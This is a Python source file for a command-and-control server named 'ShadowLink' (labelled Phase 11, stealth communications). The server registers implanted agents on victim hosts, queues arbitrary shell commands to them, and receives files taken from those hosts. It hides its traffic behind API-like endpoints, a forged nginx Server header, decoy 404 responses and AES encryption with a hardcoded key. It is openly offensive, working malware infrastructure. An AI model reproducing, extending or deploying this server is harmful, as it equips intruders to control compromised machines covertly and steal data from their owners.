#!/usr/bin/env python3
"""
ShadowLink HTTPS C2 Server
Phase 11: Stealth Communications

Features:
- HTTPS with self-signed certificate
- RESTful API endpoints that look legitimate
- AES-256-CBC encrypted payloads
- Base64 encoding for HTTP transport
- Task queue management
- Jitter-aware beacon handling
"""

import ssl
import json
import base64
import os
import threading
import queue
import time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad, pad
from Crypto.Random import get_random_bytes

# Configuration
HTTPS_HOST = "0.0.0.0"
HTTPS_PORT = 443
AES_KEY = b'ShadowLinkAES256SecretKey32Bytes'

# Agent storage
agents = {}  # {agent_id: {info...}}
agents_lock = threading.Lock()

# Task queues per agent
task_queues = {}  # {agent_id: Queue()}
task_results = {}  # {task_id: result}
task_counter = 0
task_lock = threading.Lock()


# ============================================
# ENCRYPTION FUNCTIONS
# ============================================

def aes_encrypt(data: bytes) -> bytes:
    """Encrypt data with AES-256-CBC"""
    iv = get_random_bytes(16)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    padded_data = pad(data, AES.block_size)
    encrypted = cipher.encrypt(padded_data)
    return iv + encrypted


def aes_decrypt(data: bytes) -> bytes:
    """Decrypt data with AES-256-CBC"""
    iv = data[:16]
    encrypted = data[16:]
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
    return decrypted


def encrypt_response(data: str) -> str:
    """Encrypt and base64 encode response"""
    encrypted = aes_encrypt(data.encode('utf-8'))
    return base64.b64encode(encrypted).decode('utf-8')


def decrypt_request(data: str) -> str:
    """Base64 decode and decrypt request"""
    decoded = base64.b64decode(data)
    decrypted = aes_decrypt(decoded)
    return decrypted.decode('utf-8')


# ============================================
# TASK MANAGEMENT
# ============================================

def create_task(agent_id: str, command: str) -> int:
    """Create a new task for an agent"""
    global task_counter
    
    with task_lock:
        task_counter += 1
        task_id = task_counter
        
        if agent_id not in task_queues:
            task_queues[agent_id] = queue.Queue()
        
        task_queues[agent_id].put({
            'id': task_id,
            'command': command,
            'created': datetime.now()
        })
        
        return task_id


def get_task(agent_id: str) -> dict:
    """Get next task for an agent"""
    if agent_id not in task_queues:
        return None
    
    try:
        return task_queues[agent_id].get_nowait()
    except queue.Empty:
        return None


def store_result(task_id: int, result: dict):
    """Store task result"""
    with task_lock:
        task_results[task_id] = {
            'result': result,
            'received': datetime.now()
        }


# ============================================
# HTTP REQUEST HANDLER
# ============================================

class C2Handler(BaseHTTPRequestHandler):
    """HTTPS C2 Request Handler"""
    
    def log_message(self, format, *args):
        """Custom logging"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = self.client_address[0]
        print(f"[{timestamp}] {client_ip} - {args[0]}")
    
    def send_json_response(self, data: dict, status: int = 200):
        """Send encrypted JSON response"""
        try:
            json_data = json.dumps(data)
            encrypted = encrypt_response(json_data)
            
            self.send_response(status)
            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-Length', len(encrypted))
            self.send_header('Server', 'nginx/1.18.0')  # Fake server header
            self.send_header('X-Request-ID', os.urandom(8).hex())
            self.end_headers()
            self.wfile.write(encrypted.encode('utf-8'))
        except Exception as e:
            print(f"[!] Error sending response: {e}")
    
    def get_agent_id(self) -> str:
        """Get agent ID from headers"""
        return self.headers.get('X-Client-ID', 'unknown')
    
    def read_request_body(self) -> str:
        """Read and decrypt request body"""
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length == 0:
            return None
        
        body = self.rfile.read(content_length)
        try:
            return decrypt_request(body.decode('utf-8'))
        except Exception as e:
            print(f"[!] Decrypt error: {e}")
            return None
    
    def do_GET(self):
        """Handle GET requests"""
        parsed = urlparse(self.path)
        path = parsed.path
        agent_id = self.get_agent_id()
        
        # Task endpoint - get next command
        if path == '/api/v1/updates':
            task = get_task(agent_id)
            
            if task:
                # Format: TASKID:COMMAND
                response = f"{task['id']}:{task['command']}"
                encrypted = encrypt_response(response)
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.end_headers()
                self.wfile.write(encrypted.encode('utf-8'))
                
                print(f"[+] Task {task['id']} sent to {agent_id}: {task['command'][:50]}...")
            else:
                # No task
                response = encrypt_response("NOTASK")
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.end_headers()
                self.wfile.write(response.encode('utf-8'))
            return
        
        # Download file endpoint
        if path == '/api/v1/download':
            params = parse_qs(parsed.query)
            filename = params.get('file', [''])[0]
            
            if filename and os.path.exists(f"uploads/{filename}"):
                with open(f"uploads/{filename}", 'rb') as f:
                    file_data = f.read()
                
                encrypted = aes_encrypt(file_data)
                b64_data = base64.b64encode(encrypted).decode('utf-8')
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.end_headers()
                self.wfile.write(b64_data.encode('utf-8'))
            else:
                self.send_error(404)
            return
        
        # Default - fake 404
        self.send_error(404)
    
    def do_POST(self):
        """Handle POST requests"""
        parsed = urlparse(self.path)
        path = parsed.path
        agent_id = self.get_agent_id()
        
        # Check-in endpoint
        if path == '/api/v1/status':
            body = self.read_request_body()
            if body:
                try:
                    data = json.loads(body)
                    
                    # Store/update agent info
                    with agents_lock:
                        agents[agent_id] = {
                            'hostname': data.get('hostname', 'unknown'),
                            'username': data.get('username', 'unknown'),
                            'os': data.get('os', 'unknown'),
                            'arch': data.get('arch', 'unknown'),
                            'pid': data.get('pid', 0),
                            'integrity': data.get('integrity', 'unknown'),
                            'version': data.get('version', '0'),
                            'last_seen': datetime.now(),
                            'ip': self.client_address[0]
                        }
                    
                    print(f"\n[+] Agent check-in: {agent_id}")
                    print(f"    Host: {data.get('hostname')} / User: {data.get('username')}")
                    print(f"    OS: {data.get('os')} ({data.get('arch')})")
                    print(f"    PID: {data.get('pid')} / Integrity: {data.get('integrity')}\n")
                    
                    # Send acknowledgment
                    self.send_json_response({'status': 'ok', 'agent_id': agent_id})
                    
                except json.JSONDecodeError:
                    self.send_error(400)
            else:
                self.send_error(400)
            return
        
        # Task result endpoint
        if path == '/api/v1/telemetry':
            body = self.read_request_body()
            if body:
                try:
                    data = json.loads(body)
                    task_id = data.get('task_id', 0)
                    status = data.get('status', -1)
                    output = data.get('output', '')
                    
                    store_result(task_id, {
                        'status': status,
                        'output': output,
                        'agent_id': agent_id
                    })
                    
                    print(f"\n[+] Task {task_id} result from {agent_id}:")
                    print(f"    Status: {'Success' if status == 0 else 'Failed'}")
                    if output:
                        print(f"    Output:\n{output[:500]}{'...' if len(output) > 500 else ''}\n")
                    
                    self.send_json_response({'status': 'received'})
                    
                except json.JSONDecodeError:
                    self.send_error(400)
            else:
                self.send_error(400)
            return
        
        # Upload file endpoint
        if path == '/api/v1/upload':
            params = parse_qs(parsed.query)
            filename = params.get('file', ['upload'])[0]
            
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 0:
                body = self.rfile.read(content_length)
                
                try:
                    decoded = base64.b64decode(body)
                    decrypted = aes_decrypt(decoded)
                    
                    os.makedirs('downloads', exist_ok=True)
                    filepath = f"downloads/{datetime.now().strftime('%Y%m%d_%H%M%S')}_{filename}"
                    
                    with open(filepath, 'wb') as f:
                        f.write(decrypted)
                    
                    print(f"[+] File uploaded from {agent_id}: {filepath}")
                    self.send_json_response({'status': 'ok', 'path': filepath})
                    
                except Exception as e:
                    print(f"[!] Upload error: {e}")
                    self.send_error(500)
            else:
                self.send_error(400)
            return
        
        self.send_error(404)


# ============================================
# SSL CERTIFICATE GENERATION
# ============================================

def generate_self_signed_cert(cert_file: str, key_file: str):
    """Generate self-signed certificate if not exists"""
    if os.path.exists(cert_file) and os.path.exists(key_file):
        return
    
    print("[*] Generating self-signed certificate...")
    
    # Use OpenSSL command
    os.system(f'openssl req -x509 -newkey rsa:4096 -keyout {key_file} -out {cert_file} '
              f'-days 365 -nodes -subj "/CN=localhost" 2>/dev/null')
    
    if not os.path.exists(cert_file):
        print("[!] Failed to generate certificate. Please install OpenSSL or create manually.")
        print("[*] Falling back to HTTP (insecure)...")


# ============================================
# COMMAND LINE INTERFACE
# ============================================

def cli_thread():
    """Interactive CLI for operator"""
    global current_agent
    current_agent = None
    
    print("\n[*] Type 'help' for available commands\n")
    
    while True:
        try:
            if current_agent:
                prompt = f"[HTTPS:{current_agent}]> "
            else:
                prompt = "[HTTPS]> "
            
            cmd = input(prompt).strip()
            
            if not cmd:
                continue
            
            # Server commands
            if cmd.lower() in ['help', '?']:
                print("""
╔══════════════════════════════════════════════════════════════════╗
║          SHADOWLINK HTTPS C2 SERVER - COMMANDS                   ║
╠══════════════════════════════════════════════════════════════════╣
║  SERVER COMMANDS:                                                ║
║    agents / list    - List connected agents                      ║
║    select <id>      - Select an agent                            ║
║    deselect         - Deselect current agent                     ║
║    results          - Show pending task results                  ║
║    help             - Show this help                             ║
║    quit / exit      - Stop server                                ║
║                                                                  ║
║  AGENT COMMANDS (requires selected agent):                       ║
║    <any command>    - Queue command for agent                    ║
║    shell <cmd>      - Execute shell command                      ║
║    download <path>  - Download file from agent                   ║
║    upload <path>    - Upload file to agent                       ║
║                                                                  ║
║  NOTES:                                                          ║
║    - Agents beacon periodically (5-15s with jitter)              ║
║    - Commands are queued until next beacon                       ║
║    - Results appear when agent reports back                      ║
╚══════════════════════════════════════════════════════════════════╝
                """)
                continue
            
            if cmd.lower() in ['agents', 'list', 'ls']:
                with agents_lock:
                    if not agents:
                        print("[-] No agents connected")
                        continue
                    
                    print("\n╔════════════════════════════════════════════════════════════════╗")
                    print("║                      CONNECTED AGENTS                          ║")
                    print("╠════════════════╦═══════════════╦══════════════╦════════════════╣")
                    print("║    Agent ID    ║    Hostname   ║    User      ║   Last Seen    ║")
                    print("╠════════════════╬═══════════════╬══════════════╬════════════════╣")
                    
                    for aid, info in agents.items():
                        last_seen = info['last_seen'].strftime("%H:%M:%S")
                        marker = " *" if aid == current_agent else "  "
                        print(f"║{marker}{aid:<13}║ {info['hostname']:<13} ║ {info['username']:<12} ║ {last_seen:<14} ║")
                    
                    print("╚════════════════╩═══════════════╩══════════════╩════════════════╝")
                    print("  * = selected agent\n")
                continue
            
            if cmd.lower().startswith('select '):
                agent_id = cmd.split(' ', 1)[1].strip()
                with agents_lock:
                    if agent_id in agents:
                        current_agent = agent_id
                        print(f"[+] Selected agent: {agent_id}")
                    else:
                        print(f"[-] Agent not found: {agent_id}")
                continue
            
            if cmd.lower() == 'deselect':
                current_agent = None
                print("[*] Agent deselected")
                continue
            
            if cmd.lower() == 'results':
                with task_lock:
                    if not task_results:
                        print("[-] No results pending")
                        continue
                    
                    print("\n[*] Task Results:")
                    for tid, res in list(task_results.items())[-10:]:  # Last 10
                        print(f"    Task {tid}: Status={res['result']['status']}")
                        if res['result'].get('output'):
                            print(f"    Output: {res['result']['output'][:100]}...")
                        print()
                continue
            
            if cmd.lower() in ['quit', 'exit', 'q']:
                print("[*] Shutting down...")
                os._exit(0)
            
            # Agent commands
            if current_agent is None:
                print("[-] No agent selected. Use 'select <agent_id>'")
                continue
            
            # Queue command for agent
            task_id = create_task(current_agent, cmd)
            print(f"[+] Task {task_id} queued for {current_agent}")
            print(f"    Command: {cmd}")
            print(f"    Waiting for agent to beacon...")
            
        except KeyboardInterrupt:
            print("\n[*] Use 'quit' to exit")
        except EOFError:
            break


# ============================================
# MAIN
# ============================================

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║           SHADOWLINK HTTPS C2 SERVER - Phase 11              ║
║                 Stealth Communications                       ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Create directories
    os.makedirs('downloads', exist_ok=True)
    os.makedirs('uploads', exist_ok=True)
    os.makedirs('certs', exist_ok=True)
    
    # Certificate files
    cert_file = 'certs/server.crt'
    key_file = 'certs/server.key'
    
    # Generate certificate
    generate_self_signed_cert(cert_file, key_file)
    
    # Create HTTPS server
    server = HTTPServer((HTTPS_HOST, HTTPS_PORT), C2Handler)
    
    # Wrap with SSL if certificate exists
    if os.path.exists(cert_file) and os.path.exists(key_file):
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(cert_file, key_file)
        server.socket = context.wrap_socket(server.socket, server_side=True)
        print(f"[+] HTTPS server running on https://{HTTPS_HOST}:{HTTPS_PORT}")
    else:
        print(f"[!] Running HTTP (insecure) on http://{HTTPS_HOST}:{HTTPS_PORT}")
    
    # Start CLI thread
    cli = threading.Thread(target=cli_thread, daemon=True)
    cli.start()
    
    # Start server
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped")


if __name__ == "__main__":
    main()
